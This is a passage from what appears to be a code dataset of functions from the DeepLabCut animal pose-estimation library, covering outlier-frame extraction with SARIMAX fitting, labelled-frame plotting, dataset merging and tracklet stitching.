        For outlieralgorithm ``'uncertain'`` this parameter defines the likelihood
        below which a body part will be flagged as a putative outlier.

    epsilon: float, optional, default=20
        If ``'outlieralgorithm'`` is ``'fitting'``, this is the float bound according
        to which frames are picked when the (average) body part estimate deviates from
        model fit.

        If ``'outlieralgorithm'`` is ``'jump'``, this is the float bound specifying the
        distance by which body points jump from one frame to next (Euclidean distance).

    ARdegree: int, optional, default=3
        For outlieralgorithm ``'fitting'``: Autoregressive degree of ARIMA model degree.
        (Note we use SARIMAX without exogeneous and seasonal part)
        See https://www.statsmodels.org/dev/generated/statsmodels.tsa.statespace.sarimax.SARIMAX.html

    MAdegree: int, optional, default=1
        For outlieralgorithm ``'fitting'``: MovingAvarage degree of ARIMA model degree.
        (Note we use SARIMAX without exogeneous and seasonal part)
        See https://www.statsmodels.org/dev/generated/statsmodels.tsa.statespace.sarimax.SARIMAX.html

    alpha: float, optional, default=0.01
        Significance level for detecting outliers based on confidence interval of
        fitted ARIMA model. Only the distance is used however.

    extractionalgorithm : str, optional, default=""kmeans""
        String specifying the algorithm to use for selecting the frames from the
        identified putatative outlier frames. Currently, deeplabcut supports either
        ``kmeans`` or ``uniform`` based selection (same logic as for extract_frames).

    automatic : bool, optional, default=False
        If ``True``, extract outliers without being asked for user feedback.

    cluster_resizewidth: number, default=30
        If ``""extractionalgorithm""`` is ``""kmeans""``, one can change the width to which
        the images are downsampled (aspect ratio is fixed).

    cluster_color: bool, optional, default=False
        If ``False``, each downsampled image is treated as a grayscale vector
        (discarding color information). If ``True``, then the color channels are
        considered. This increases the computational complexity.

    opencv: bool, optional, default=True
        Uses openCV for loading & extractiong (otherwise moviepy (legacy)).

    savelabeled: bool, optional, default=False
        If ``True``, frame are saved with predicted labels in each folder.

    copy_videos: bool, optional, default=False
        If True, newly-added videos (from which outlier frames are extracted) are
        copied to the project folder. By default, symbolic links are created instead.

    destfolder: str or None, optional, default=None
        Specifies the destination folder that was used for storing analysis data. If
        ``None``, the path of the video is used.

    modelprefix: str, optional, default=""""
        Directory containing the deeplabcut models to use when evaluating the network.
        By default, the models are assumed to exist in the project folder.

    track_method: str, optional, default=""""
         Specifies the tracker used to generate the data.
         Empty by default (corresponding to a single animal project).
         For multiple animals, must be either 'box', 'skeleton', or 'ellipse' and will
         be taken from the config.yaml file if none is given.

    Returns
    -------
    None

    Examples
    --------

    Extract the frames with default settings on Windows.

    >>> deeplabcut.extract_outlier_frames(
            'C:\\myproject\\reaching-task\\config.yaml',
            ['C:\\yourusername\\rig-95\\Videos\\reachingvideo1.avi'],
        )

    Extract the frames with default settings on Linux/MacOS.

    >>> deeplabcut.extract_outlier_frames(
            '/analysis/project/reaching-task/config.yaml',
            ['/analysis/project/video/reachinvideo1.avi'],
        )

    Extract the frames using the ""kmeans"" algorithm.

    >>> deeplabcut.extract_outlier_frames(
            '/analysis/project/reaching-task/config.yaml',
            ['/analysis/project/video/reachinvideo1.avi'],
            extractionalgorithm='kmeans',
        )

    Extract the frames using the ""kmeans"" algorithm and ``""epsilon=5""`` pixels.

    >>> deeplabcut.extract_outlier_frames(
            '/analysis/project/reaching-task/config.yaml',
            ['/analysis/project/video/reachinvideo1.avi'],
            epsilon=5,
            extractionalgorithm='kmeans',
        )
    """"""
    cfg = auxiliaryfunctions.read_config(config)
    bodyparts = auxiliaryfunctions.intersection_of_body_parts_and_ones_given_by_user(cfg, comparisonbodyparts)
    if not len(bodyparts):
        raise ValueError('No valid bodyparts were selected.')
    track_method = auxfun_multianimal.get_track_method(cfg, track_method=track_method)
    (DLCscorer, DLCscorerlegacy) = auxiliaryfunctions.get_scorer_name(cfg, shuffle, trainFraction=cfg['TrainingFraction'][trainingsetindex], modelprefix=modelprefix)
    Videos = auxiliaryfunctions.get_list_of_videos(videos, videotype)
    if len(Videos) == 0:
        print('No suitable videos found in', videos)
    for video in Videos:
        if destfolder is None:
            videofolder = str(Path(video).parents[0])
        else:
            videofolder = destfolder
        vname = os.path.splitext(os.path.basename(video))[0]
        try:
            (df, dataname, _, _) = auxiliaryfunctions.load_analyzed_data(videofolder, vname, DLCscorer, track_method=track_method)
            nframes = len(df)
            startindex = max([int(np.floor(nframes * cfg['start'])), 0])
            stopindex = min([int(np.ceil(nframes * cfg['stop'])), nframes])
            Index = np.arange(stopindex - startindex) + startindex
            df = df.iloc[Index]
            mask = df.columns.get_level_values('bodyparts').isin(bodyparts)
            df_temp = df.loc[:, mask]
            Indices = []
            if outlieralgorithm == 'uncertain':
                p = df_temp.xs('likelihood', level='coords', axis=1)
                ind = df_temp.index[(p < p_bound).any(axis=1)].tolist()
                Indices.extend(ind)
            elif outlieralgorithm == 'jump':
                temp_dt = df_temp.diff(axis=0) ** 2
                temp_dt.drop('likelihood', axis=1, level='coords', inplace=True)
                sum_ = temp_dt.groupby(level='bodyparts', axis=1).sum()
                ind = df_temp.index[(sum_ > epsilon ** 2).any(axis=1)].tolist()
                Indices.extend(ind)
            elif outlieralgorithm == 'fitting':
                (d, o) = compute_deviations(df_temp, dataname, p_bound, alpha, ARdegree, MAdegree)
                ind = np.flatnonzero(d > epsilon)
                if len(ind) < cfg['numframes2pick'] * 2 and len(d) > cfg['numframes2pick'] * 2:
                    ind = np.argsort(d)[::-1][:cfg['numframes2pick'] * 2]
                Indices.extend(ind)
            elif outlieralgorithm == 'manual':
                from deeplabcut.gui.widgets import launch_napari
                added_video = attempt_to_add_video(config=config, video=video, copy_videos=copy_videos, coords=None)
                if added_video:
                    project_video_path = Path(cfg['project_path']) / 'videos' / Path(video).name
                    _ = launch_napari([project_video_path, dataname])
                return
            elif outlieralgorithm == 'list':
                if frames2use is not None:
                    try:
                        frames2use = np.array(frames2use).astype('int')
                    except ValueError() as e:
                        print('Could not cast frames2use into np array, please check that frames2use is a simply a list of integers!')
                        raise
                    Indices.extend(frames2use)
                else:
                    raise ValueError('Expected list of frames2use for outlieralgorithm ""list""!')
            else:
                raise ValueError(f'outlieralgorithm {outlieralgorithm} not recognized!')
            if not outlieralgorithm == 'manual':
                Indices = np.sort(list(set(Indices)))
                print('Method ', outlieralgorithm, ' found ', len(Indices), ' putative outlier frames.')
                print('Do you want to proceed with extracting ', cfg['numframes2pick'], ' of those?')
                if outlieralgorithm == 'uncertain' or outlieralgorithm == 'jump':
                    print('If this list is very large, perhaps consider changing the parameters (start, stop, p_bound, comparisonbodyparts) or use a different method.')
                elif outlieralgorithm == 'fitting':
                    print('If this list is very large, perhaps consider changing the parameters (start, stop, epsilon, ARdegree, MAdegree, alpha, comparisonbodyparts) or use a different method.')
                if not automatic:
                    askuser = input('yes/no')
                else:
                    askuser = 'Ja'
                if askuser == 'y' or askuser == 'yes' or askuser == 'Ja' or (askuser == 'ha'):
                    ExtractFramesbasedonPreselection(Indices, extractionalgorithm, df, video, cfg, config, opencv, cluster_resizewidth, cluster_color, savelabeled, copy_videos=copy_videos)
                else:
                    print('Nothing extracted, please change the parameters and start again...')
        except FileNotFoundError as e:
            print(e)
            print(""It seems the video has not been analyzed yet, or the video is not found! You can only refine the labels after the a video is analyzed. Please run 'analyze_video' first. Or, please double check your video file path"")"
AlexEMG/DeepLabCut,convertparms2start,"def convertparms2start(pn):
    """"""Creating a start value for sarimax in case of an value error
    See: https://groups.google.com/forum/#!topic/pystatsmodels/S_Fo53F25Rk""""""
    if 'ar.' in pn:
        return 0
    elif 'ma.' in pn:
        return 0
    elif 'sigma' in pn:
        return 1
    else:
        return 0"
AlexEMG/DeepLabCut,FitSARIMAXModel,"def FitSARIMAXModel(x, p, pcutoff, alpha, ARdegree, MAdegree, nforecast=0, disp=False):
    Y = x.copy()
    Y[p < pcutoff] = np.nan
    if np.sum(np.isfinite(Y)) > 10:
        mod = sm.tsa.statespace.SARIMAX(Y.flatten(), order=(ARdegree, 0, MAdegree), seasonal_order=(0, 0, 0, 0), simple_differencing=True)
        try:
            res = mod.fit(disp=disp)
        except ValueError:
            startvalues = np.array([convertparms2start(pn) for pn in mod.param_names])
            res = mod.fit(start_params=startvalues, disp=disp)
        except np.linalg.LinAlgError:
            mod = sm.tsa.statespace.SARIMAX(Y.flatten(), order=(ARdegree, 0, MAdegree), seasonal_order=(0, 0, 0, 0), simple_differencing=True, enforce_stationarity=False, enforce_invertibility=False, use_exact_diffuse=False)
            res = mod.fit(disp=disp)
        predict = res.get_prediction(end=mod.nobs + nforecast - 1)
        return (predict.predicted_mean, predict.conf_int(alpha=alpha))
    else:
        return (np.nan * np.zeros(len(Y)), np.nan * np.zeros((len(Y), 2)))"
AlexEMG/DeepLabCut,compute_deviations,"def compute_deviations(Dataframe, dataname, p_bound, alpha, ARdegree, MAdegree, storeoutput=None):
    """"""Fits Seasonal AutoRegressive Integrated Moving Average with eXogenous regressors model to data and computes confidence interval
    as well as mean fit.""""""
    print('Fitting state-space models with parameters:', ARdegree, MAdegree)
    (df_x, df_y, df_likelihood) = Dataframe.values.reshape((Dataframe.shape[0], -1, 3)).T
    preds = []
    for row in range(len(df_x)):
        x = df_x[row]
        y = df_y[row]
        p = df_likelihood[row]
        (meanx, CIx) = FitSARIMAXModel(x, p, p_bound, alpha, ARdegree, MAdegree)
        (meany, CIy) = FitSARIMAXModel(y, p, p_bound, alpha, ARdegree, MAdegree)
        distance = np.sqrt((x - meanx) ** 2 + (y - meany) ** 2)
        significant = (x < CIx[:, 0]) + (x > CIx[:, 1]) + (y < CIy[:, 0]) + (y > CIy[:, 1])
        preds.append(np.c_[distance, significant, meanx, meany, CIx, CIy])
    columns = Dataframe.columns
    prod = []
    for i in range(columns.nlevels - 1):
        prod.append(columns.get_level_values(i).unique())
    prod.append(['distance', 'sig', 'meanx', 'meany', 'lowerCIx', 'higherCIx', 'lowerCIy', 'higherCIy'])
    pdindex = pd.MultiIndex.from_product(prod, names=columns.names)
    data = pd.DataFrame(np.concatenate(preds, axis=1), columns=pdindex)
    d = data.xs('distance', axis=1, level=-1).mean(axis=1).values
    o = data.xs('sig', axis=1, level=-1).mean(axis=1).values
    if storeoutput == 'full':
        data.to_hdf(dataname.split('.h5')[0] + 'filtered.h5', 'df_with_missing', format='table', mode='w')
        return (d, o, data)
    else:
        return (d, o)"
AlexEMG/DeepLabCut,attempt_to_add_video,"def attempt_to_add_video(config: str, video: str, copy_videos: bool, coords: Optional[List]) -> bool:
    """"""
    Add new videos to the config file at any stage of the project.

    Parameters
    ----------
    config : string
        Full path of the config file in the project.

    video : string
        Full path of the video to add to the project.

    copy_videos : bool, optional
        If this is set to True, the videos will be copied to the project/videos directory. If False, the symlink of the
        videos will be copied instead. The default is
        ``False``; if provided it must be either ``True`` or ``False``.

    coords: list, optional
        A list containing the list of cropping coordinates of the video. The default is set to None.

    Returns
    -------
    True iff the video was successfully added to the project
    """"""
    from deeplabcut.create_project import add
    videos = [video]
    if coords is not None:
        coords = [coords]
    try:
        add.add_new_videos(config, videos, coords=coords, copy_videos=copy_videos)
    except:
        print(f'AUTOMATIC ADDING OF VIDEO TO CONFIG FILE FAILED! You need to do this manually for including it in the config.yaml file!')
        print('Videopath:', video, 'Coordinates for cropping:', coords)
        return False
    return True"
AlexEMG/DeepLabCut,ExtractFramesbasedonPreselection,"def ExtractFramesbasedonPreselection(Index, extractionalgorithm, data, video, cfg, config, opencv=True, cluster_resizewidth=30, cluster_color=False, savelabeled=True, with_annotations=True, copy_videos=False):
    start = cfg['start']
    stop = cfg['stop']
    numframes2extract = cfg['numframes2pick']
    bodyparts = auxiliaryfunctions.intersection_of_body_parts_and_ones_given_by_user(cfg, 'all')
    videofolder = str(Path(video).parents[0])
    vname = str(Path(video).stem)
    tmpfolder = os.path.join(cfg['project_path'], 'labeled-data', vname)
    if os.path.isdir(tmpfolder):
        print('Frames from video', vname, ' already extracted (more will be added)!')
    else:
        auxiliaryfunctions.attempt_to_make_folder(tmpfolder, recursive=True)
    nframes = len(data)
    print('Loading video...')
    if opencv:
        vid = VideoWriter(video)
        fps = vid.fps
        duration = vid.calc_duration()
    else:
        from moviepy.editor import VideoFileClip
        clip = VideoFileClip(video)
        fps = clip.fps
        duration = clip.duration
    if cfg['cropping']:
        coords = cfg['video_sets'].get(video, {}).get('crop')
        if coords is not None:
            coords = list(map(int, coords.split(', ')))
    else:
        coords = None
    print('Cropping coords:', coords)
    print('Duration of video [s]: ', duration, ', recorded @ ', fps, 'fps!')
    print('Overall # of frames: ', nframes, 'with (cropped) frame dimensions: ')
    if extractionalgorithm == 'uniform':
        if opencv:
            if coords is not None:
                vid.set_bbox(*coords)
            frames2pick = frameselectiontools.UniformFramescv2(vid, numframes2extract, start, stop, Index)
        else:
            if coords is not None:
                clip = clip.crop(y1=coords[2], y2=coords[3], x1=coords[0], x2=coords[1])
            frames2pick = frameselectiontools.UniformFrames(clip, numframes2extract, start, stop, Index)
    elif extractionalgorithm == 'kmeans':
        if opencv:
            if coords is not None:
                vid.set_bbox(*coords)
            frames2pick = frameselectiontools.KmeansbasedFrameselectioncv2(vid, numframes2extract, start, stop, Index, resizewidth=cluster_resizewidth, color=cluster_color)
        else:
            if coords is not None:
                clip = clip.crop(y1=coords[2], y2=coords[3], x1=coords[0], x2=coords[1])
            frames2pick = frameselectiontools.KmeansbasedFrameselection(clip, numframes2extract, start, stop, Index, resizewidth=cluster_resizewidth, color=cluster_color)
    else:
        print(""Please implement this method yourself! Currently the options are 'kmeans', 'jump', 'uniform'."")
        frames2pick = []
    print(""Let's select frames indices:"", frames2pick)
    colors = visualization.get_cmap(len(bodyparts), cfg['colormap'])
    strwidth = int(np.ceil(np.log10(nframes)))
    for index in frames2pick:
        if opencv:
            PlottingSingleFramecv2(vid, data, bodyparts, tmpfolder, index, cfg['dotsize'], cfg['pcutoff'], cfg['alphavalue'], colors, strwidth, savelabeled)
        else:
            PlottingSingleFrame(clip, data, bodyparts, tmpfolder, index, cfg['dotsize'], cfg['pcutoff'], cfg['alphavalue'], colors, strwidth, savelabeled)
        plt.close('all')
    if opencv:
        vid.close()
    else:
        clip.close()
        del clip
    if len(frames2pick) > 0:
        added_video = attempt_to_add_video(config=config, video=video, copy_videos=copy_videos, coords=coords)
        if not added_video:
            pass
        if with_annotations:
            machinefile = os.path.join(tmpfolder, 'machinelabels-iter' + str(cfg['iteration']) + '.h5')
            if isinstance(data, pd.DataFrame):
                df = data.loc[frames2pick]
                df.index = pd.MultiIndex.from_tuples([('labeled-data', vname, 'img' + str(index).zfill(strwidth) + '.png') for index in df.index])
            elif isinstance(data, dict):
                idx = pd.MultiIndex.from_tuples([('labeled-data', vname, 'img' + str(index).zfill(strwidth) + '.png') for index in frames2pick])
                filename = os.path.join(str(tmpfolder), f""CollectedData_{cfg['scorer']}.h5"")
                try:
                    df_temp = pd.read_hdf(filename, 'df_with_missing')
                    columns = df_temp.columns
                except FileNotFoundError:
                    columns = pd.MultiIndex.from_product([[cfg['scorer']], cfg['individuals'], cfg['multianimalbodyparts'], ['x', 'y']], names=['scorer', 'individuals', 'bodyparts', 'coords'])
                    if cfg['uniquebodyparts']:
                        columns2 = pd.MultiIndex.from_product([[cfg['scorer']], ['single'], cfg['uniquebodyparts'], ['x', 'y']], names=['scorer', 'individuals', 'bodyparts', 'coords'])
                        df_temp = pd.concat((pd.DataFrame(columns=columns), pd.DataFrame(columns=columns2)))
                        columns = df_temp.columns
                array = np.full((len(frames2pick), len(columns)), np.nan)
                for (i, index) in enumerate(frames2pick):
                    data_temp = data.get(index)
                    if data_temp is not None:
                        vals = np.concatenate(data_temp)[:, :2].flatten()
                        array[i, :len(vals)] = vals
                df = pd.DataFrame(array, index=idx, columns=columns)
            else:
                return
            if Path(machinefile).is_file():
                Data = pd.read_hdf(machinefile, 'df_with_missing')
                conversioncode.guarantee_multiindex_rows(Data)
                DataCombined = pd.concat([Data, df])
                DataCombined = DataCombined[~DataCombined.index.duplicated(keep='first')]
                DataCombined.to_hdf(machinefile, key='df_with_missing', mode='w')
                DataCombined.to_csv(os.path.join(tmpfolder, 'machinelabels.csv'))
            else:
                df.to_hdf(machinefile, key='df_with_missing', mode='w')
                df.to_csv(os.path.join(tmpfolder, 'machinelabels.csv'))
        print('The outlier frames are extracted. They are stored in the subdirectory labeled-data\\%s.' % vname)
        print(""Once you extracted frames for all videos, use 'refine_labels' to manually correct the labels."")
    else:
        print('No frames were extracted.')"
AlexEMG/DeepLabCut,PlottingSingleFrame,"def PlottingSingleFrame(clip, Dataframe, bodyparts2plot, tmpfolder, index, dotsize, pcutoff, alphavalue, colors, strwidth=4, savelabeled=True):
    """"""Label frame and save under imagename / this is already cropped (for clip)""""""
    from skimage import io
    imagename1 = os.path.join(tmpfolder, 'img' + str(index).zfill(strwidth) + '.png')
    imagename2 = os.path.join(tmpfolder, 'img' + str(index).zfill(strwidth) + 'labeled.png')
    if not os.path.isfile(os.path.join(tmpfolder, 'img' + str(index).zfill(strwidth) + '.png')):
        plt.axis('off')
        image = img_as_ubyte(clip.get_frame(index * 1.0 / clip.fps))
        io.imsave(imagename1, image)
        if savelabeled:
            if np.ndim(image) > 2:
                (h, w, nc) = np.shape(image)
            else:
                (h, w) = np.shape(image)
            bpts = Dataframe.columns.get_level_values('bodyparts')
            all_bpts = bpts.values[::3]
            (df_x, df_y, df_likelihood) = Dataframe.values.reshape((Dataframe.shape[0], -1, 3)).T
            bplist = bpts.unique().to_list()
            if Dataframe.columns.nlevels == 3:
                map2bp = list(range(len(all_bpts)))
            else:
                map2bp = [bplist.index(bp) for bp in all_bpts]
            keep = np.flatnonzero(np.isin(all_bpts, bodyparts2plot))
            plt.figure(frameon=False, figsize=(w * 1.0 / 100, h * 1.0 / 100))
            plt.subplots_adjust(left=0, bottom=0, right=1, top=1, wspace=0, hspace=0)
            plt.imshow(image)
            for (i, ind) in enumerate(keep):
                if df_likelihood[ind, index] > pcutoff:
                    plt.scatter(df_x[ind, index], df_y[ind, index], s=dotsize ** 2, color=colors(map2bp[i]), alpha=alphavalue)
            plt.xlim(0, w)
            plt.ylim(0, h)
            plt.axis('off')
            plt.subplots_adjust(left=0, bottom=0, right=1, top=1, wspace=0, hspace=0)
            plt.gca().invert_yaxis()
            plt.savefig(imagename2)
            plt.close('all')"
AlexEMG/DeepLabCut,PlottingSingleFramecv2,"def PlottingSingleFramecv2(cap, Dataframe, bodyparts2plot, tmpfolder, index, dotsize, pcutoff, alphavalue, colors, strwidth=4, savelabeled=True):
    """"""Label frame and save under imagename / cap is not already cropped.""""""
    from skimage import io
    imagename1 = os.path.join(tmpfolder, 'img' + str(index).zfill(strwidth) + '.png')
    imagename2 = os.path.join(tmpfolder, 'img' + str(index).zfill(strwidth) + 'labeled.png')
    if not os.path.isfile(os.path.join(tmpfolder, 'img' + str(index).zfill(strwidth) + '.png')):
        plt.axis('off')
        cap.set_to_frame(index)
        frame = cap.read_frame(crop=True)
        if frame is None:
            print('Frame could not be read.')
            return
        image = img_as_ubyte(frame)
        io.imsave(imagename1, image)
        if savelabeled:
            if np.ndim(image) > 2:
                (h, w, nc) = np.shape(image)
            else:
                (h, w) = np.shape(image)
            bpts = Dataframe.columns.get_level_values('bodyparts')
            all_bpts = bpts.values[::3]
            (df_x, df_y, df_likelihood) = Dataframe.values.reshape((Dataframe.shape[0], -1, 3)).T
            bplist = bpts.unique().to_list()
            if Dataframe.columns.nlevels == 3:
                map2bp = list(range(len(all_bpts)))
            else:
                map2bp = [bplist.index(bp) for bp in all_bpts]
            keep = np.flatnonzero(np.isin(all_bpts, bodyparts2plot))
            plt.figure(frameon=False, figsize=(w * 1.0 / 100, h * 1.0 / 100))
            plt.subplots_adjust(left=0, bottom=0, right=1, top=1, wspace=0, hspace=0)
            plt.imshow(image)
            for (i, ind) in enumerate(keep):
                if df_likelihood[ind, index] > pcutoff:
                    plt.scatter(df_x[ind, index], df_y[ind, index], s=dotsize ** 2, color=colors(map2bp[i]), alpha=alphavalue)
            plt.xlim(0, w)
            plt.ylim(0, h)
            plt.axis('off')
            plt.subplots_adjust(left=0, bottom=0, right=1, top=1, wspace=0, hspace=0)
            plt.gca().invert_yaxis()
            plt.savefig(imagename2)
            plt.close('all')"
AlexEMG/DeepLabCut,merge_datasets,"def merge_datasets(config, forceiterate=None):
    """"""Merge the original training dataset with the newly refined data.

    Checks if the original training dataset can be merged with the newly refined
    training dataset. To do so it will check if the frames in all extracted video sets
    were relabeled.

    If this is the case then the ``""iteration""`` variable is advanced by 1.

    Parameters
    ----------
    config: str
        Full path of the config.yaml file.

    forceiterate: int or None, optional, default=None
        If an integer is given the iteration variable is set to this value
        This is only done if all datasets were labeled or refined.

    Examples
    --------

    >>> deeplabcut.merge_datasets('/analysis/project/reaching-task/config.yaml')
    """"""
    cfg = auxiliaryfunctions.read_config(config)
    config_path = Path(config).parents[0]
    bf = Path(str(config_path / 'labeled-data'))
    allfolders = [os.path.join(bf, fn) for fn in os.listdir(bf) if '_labeled' not in fn and (not fn.startswith('.'))]
    flagged = False
    for (findex, folder) in enumerate(allfolders):
        if os.path.isfile(os.path.join(folder, 'MachineLabelsRefine.h5')):
            pass
        elif os.path.isfile(os.path.join(folder, 'CollectedData_' + cfg['scorer'] + '.h5')):
            pass
        else:
            print('The following folder was not manually refined,...', folder)
            flagged = True
            pass
    if not flagged:
        iter_prev = cfg['iteration']
        if not forceiterate:
            cfg['iteration'] = int(iter_prev + 1)
        else:
            cfg['iteration'] = forceiterate
        auxiliaryfunctions.write_config(config, cfg)
        print('Merged data sets and updated refinement iteration to ' + str(cfg['iteration']) + '.')
        print('Now you can create a new training set for the expanded annotated images (use create_training_dataset).')
    else:
        print('Please label, or remove the un-corrected folders.')"
AlexEMG/DeepLabCut,get_frame_ind,"def get_frame_ind(s):
    return int(re.findall('\\d+', s)[0])"
AlexEMG/DeepLabCut,stitch_tracklets,"def stitch_tracklets(config_path, videos, videotype='', shuffle=1, trainingsetindex=0, n_tracks=None, min_length=10, split_tracklets=True, prestitch_residuals=True, max_gap=None, weight_func=None, destfolder=None, modelprefix='', track_method='', output_name='', transformer_checkpoint='', save_as_csv=False):
    """"""
    Stitch sparse tracklets into full tracks via a graph-based,
    minimum-cost flow optimization problem.

    Parameters
    ----------
    config_path : str
        Path to the main project config.yaml file.

    videos : list
        A list of strings containing the full paths to videos for analysis or a path to the directory, where all the videos with same extension are stored.

    videotype: string, optional
        Checks for the extension of the video in case the input to the video is a directory.
 Only videos with this extension are analyzed.
        If left unspecified, videos with common extensions ('avi', 'mp4', 'mov', 'mpeg', 'mkv') are kept.

    shuffle: int, optional
        An integer specifying the shuffle index of the training dataset used for training the network. The default is 1.

    trainingsetindex: int, optional
        Integer specifying which TrainingsetFraction to use. By default the first (note that TrainingFraction is a list in config.yaml).

    n_tracks : int, optional
        Number of tracks to reconstruct. By default, taken as the number
        of individuals defined in the config.yaml. Another number can be
        passed if the number of animals in the video is different from
        the number of animals the model was trained on.

    min_length : int, optional
        Tracklets less than `min_length` frames of length
        are considered to be residuals; i.e., they do not participate
        in building the graph and finding the solution to the
        optimization problem, but are rather added last after
        ""almost-complete"" tracks are formed. The higher the value,
        the lesser the computational cost, but the higher the chance of
        discarding relatively long and reliable tracklets that are
        essential to solving the stitching task.
        Default is 10, and must be 3 at least.

    split_tracklets : bool, optional
        By default, tracklets whose time indices are not consecutive integers
        are split in shorter tracklets whose time continuity is guaranteed.
        This is for example very powerful to get rid of tracking errors
        (e.g., identity switches) which are often signaled by a missing
        time frame at the moment they occur. Note though that for long
        occlusions where tracker re-identification capability can be trusted,
        setting `split_tracklets` to False is preferable.

    prestitch_residuals : bool, optional
        Residuals will by default be grouped together according to their
        temporal proximity prior to being added back to the tracks.
        This is done to improve robustness and simultaneously reduce complexity.

    max_gap : int, optional
        Maximal temporal gap to allow between a pair of tracklets.
        This is automatically determined by the TrackletStitcher by default.

    weight_func : callable, optional
        Function accepting two tracklets as arguments and returning a scalar
        that must be inversely proportional to the likelihood that the tracklets
        belong to the same track; i.e., the higher the confidence that the
        tracklets should be stitched together, the lower the returned value.

    destfolder: string, optional
        Specifies the destination folder for analysis data (default is the path of the video). Note that for subsequent analysis this
        folder also needs to be passed.

    track_method: string, optional
         Specifies the tracker used to generate the pose estimation data.
         For multiple animals, must be either 'box', 'skeleton', or 'ellipse'
         and will be taken from the config.yaml file if none is given.

    output_name : str, optional
        Name of the output h5 file.
        By default, tracks are automatically stored into the same directory
        as the pickle file and with its name.

    save_as_csv: bool, optional
        Whether to write the tracks to a CSV file too (False by default).

    Returns
    -------
    A TrackletStitcher object
    """"""
    vids = deeplabcut.utils.auxiliaryfunctions.get_list_of_videos(videos, videotype)
    if not vids:
        print('No video(s) found. Please check your path!')
        return
    cfg = auxiliaryfunctions.read_config(config_path)
    track_method = auxfun_multianimal.get_track_method(cfg, track_method=track_method)
    animal_names = cfg['individuals']
    if n_tracks is None:
        n_tracks = len(animal_names)
    (DLCscorer, _) = deeplabcut.utils.auxiliaryfunctions.GetScorerName(cfg, shuffle, cfg['TrainingFraction'][trainingsetindex], modelprefix=modelprefix)
    if transformer_checkpoint:
        from deeplabcut.pose_tracking_pytorch import inference
        dlctrans = inference.DLCTrans(checkpoint=transformer_checkpoint)

    def trans_weight_func(tracklet1, tracklet2, nframe, feature_dict):
        zfill_width = int(np.ceil(np.log10(nframe)))
        if tracklet1 < tracklet2:
            ind_img1 = tracklet1.inds[-1]
            coord1 = tracklet1.data[-1][:, :2]
            ind_img2 = tracklet2.inds[0]
            coord2 = tracklet2.data[0][:, :2]
        else:
            ind_img2 = tracklet2.inds[-1]
            ind_img1 = tracklet1.inds[0]
            coord2 = tracklet2.data[-1][:, :2]
            coord1 = tracklet1.data[0][:, :2]
        t1 = (coord1, ind_img1)
        t2 = (coord2, ind_img2)
        dist = dlctrans(t1, t2, zfill_width, feature_dict)
        dist = (dist + 1) / 2
        return -dist
    for video in vids:
        print('Processing... ', video)
        nframe = len(VideoWriter(video))
        videofolder = str(Path(video).parents[0])
        dest = destfolder or videofolder
        deeplabcut.utils.auxiliaryfunctions.attempt_to_make_folder(dest)
        vname = Path(video).stem
        feature_dict_path = os.path.join(dest, vname + DLCscorer + '_bpt_features.pickle')
        if transformer_checkpoint:
            import dbm
            try:
                feature_dict = shelve.open(feature_dict_path, flag='r')
            except dbm.error:
                raise FileNotFoundError(f'{feature_dict_path} does not exist. Did you run transformer_reID()?')
        dataname = os.path.join(dest, vname + DLCscorer + '.h5')
        method = TRACK_METHODS[track_method]
        pickle_file = dataname.split('.h5')[0] + f'{method}.pickle'
        try:
            stitcher = TrackletStitcher.from_pickle(pickle_file, n_tracks, min_length, split_tracklets, prestitch_residuals)
            with_id = any((tracklet.identity != -1 for tracklet in stitcher))
            if with_id and weight_func is None:

                def weight_func(t1, t2):
                    w = 0.01 if t1.identity == t2.identity else 1
                    return w * stitcher.calculate_edge_weight(t1, t2)
            if transformer_checkpoint:
                stitcher.build_graph(max_gap=max_gap, weight_func=partial(trans_weight_func, nframe=nframe, feature_dict=feature_dict))
            else:
                stitcher.build_graph(max_gap=max_gap, weight_func=weight_func)
            stitcher.stitch()
            if transformer_checkpoint:
                stitcher.write_tracks(output_name=output_name, animal_names=animal_names, suffix='tr', save_as_csv=save_as_csv)
            else:
                stitcher.write_tracks(output_name=output_name, animal_names=animal_names, suffix='', save_as_csv=save_as_csv)
        except FileNotFoundError as e:
            print(e, '\nSkipping...')"
AlexEMG/DeepLabCut,__init__,"def __init__(self, data, inds):
    """"""
        Create a Tracklet object.

        Parameters
        ----------
        data : ndarray
            3D array of shape (nframes, nbodyparts, 3 or 4), where the last
            dimension is for x, y, likelihood and, optionally, identity.
        inds : array-like
            Corresponding time frame indices.
        """"""
    if data.ndim != 3 or data.shape[-1] not in (3, 4):
        raise ValueError('Data must of shape (nframes, nbodyparts, 3 or 4)')
    if data.shape[0] != len(inds):
        raise ValueError('Data and corresponding indices must have the same length.')
    self.data = data.astype(np.float64)
    self.inds = np.array(inds)
    monotonically_increasing = all((a < b for (a, b) in zip(inds, inds[1:])))
    if not monotonically_increasing:
        idx = np.argsort(inds, kind='mergesort')
        self.inds = self.inds[idx]
        self.data = self.data[idx]
    self._centroid = None"
AlexEMG/DeepLabCut,__len__,"def __len__(self):
    return self.inds.size"
AlexEMG/DeepLabCut,__add__,"def __add__(self, other):
    """"""Join this tracklet to another one.""""""
    data = np.concatenate((self.data, other.data))
    inds = np.concatenate((self.inds, other.inds))
    return Tracklet(data, inds)"
AlexEMG/DeepLabCut,__radd__,"def __radd__(self, other):
    if other == 0:
        return self
    return self.__add__(other)"
AlexEMG/DeepLabCut,__sub__,"def __sub__(self, other):
    mask = np.isin(self.inds, other.inds, assume_unique=True)
    if mask.all():
        return None
    return Tracklet(self.data[~mask], self.inds[~mask])"
AlexEMG/DeepLabCut,__lt__,"def __lt__(self, other):
    """"""Test whether this tracklet precedes the other one.""""""
    return self.end < other.start"
AlexEMG/DeepLabCut,__gt__,"def __gt__(self, other):
    """"""Test whether this tracklet follows the other one.""""""
    return self.start > other.end"
AlexEMG/DeepLabCut,__contains__,"def __contains__(self, other_tracklet):
    """"""Test whether tracklets temporally overlap.""""""
    return np.isin(self.inds, other_tracklet.inds, assume_unique=True).any()"
AlexEMG/DeepLabCut,__repr__,"def __repr__(self):
    return f'Tracklet of length {len(self)} from {self.start} to {self.end} with reliability {self.likelihood:.3f}'"
AlexEMG/DeepLabCut,xy,"@property
def xy(self):
    """"""Return the x and y coordinates.""""""
    return self.data[..., :2]"
AlexEMG/DeepLabCut,centroid,"@property
def centroid(self):
    """"""
        Return the instantaneous 2D position of the Tracklet centroid.
        For Tracklets longer than 10 frames, the centroid is automatically
        smoothed using an exponential moving average.
        The result is cached for efficiency.
        """"""
    if self._centroid is None:
        self._update_centroid()
    return self._centroid"
AlexEMG/DeepLabCut,_update_centroid,"def _update_centroid(self):
